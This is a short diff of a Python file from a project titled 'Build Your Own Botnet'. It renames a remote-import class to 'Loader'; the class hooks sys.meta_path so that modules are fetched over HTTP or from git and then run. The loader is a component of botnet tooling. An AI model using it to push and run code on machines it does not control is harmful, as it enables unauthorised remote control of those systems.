@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Remote Import (Build Your Own Botnet)'
+'Loader (Build Your Own Botnet)'
 
 # standard library
 import imp
@@ -15,7 +15,7 @@ def log(info='', level='debug'):
     getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))
 
 # main
-class RemoteImporter(object):
+class Loader(object):
     """
     The class that implements the remote import API.
     :param list modules: list of module/package names to make available for remote import
@@ -154,16 +154,16 @@ def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=Non
 
 def add_remote_repo(modules, base_url='http://localhost:8000/'):
     """
-    Function that creates and adds to the 'sys.meta_path' an RemoteImporter object.
-    The parameters are the same as the RemoteImporter class contructor.
+    Function that creates and adds to the 'sys.meta_path' an Loader object.
+    The parameters are the same as the Loader class contructor.
     """
-    importer = RemoteImporter(modules, base_url)
+    importer = Loader(modules, base_url)
     sys.meta_path.insert(0, importer)
     return importer
 
 def remove_remote_repo(base_url):
     """
-    Function that removes from the 'sys.meta_path' an RemoteImporter object given its HTTP/S URL.
+    Function that removes from the 'sys.meta_path' an Loader object given its HTTP/S URL.
     """
     for importer in sys.meta_path:
         try:
@@ -177,7 +177,7 @@ def remove_remote_repo(base_url):
 def remote_repo(modules, base_url='http://localhost:8000/'):
     """
     Context Manager that provides remote import functionality through a URL.
-    The parameters are the same as the RemoteImporter class contructor.
+    The parameters are the same as the Loader class contructor.
     """
     importer = add_remote_repo(modules, base_url)
     yield
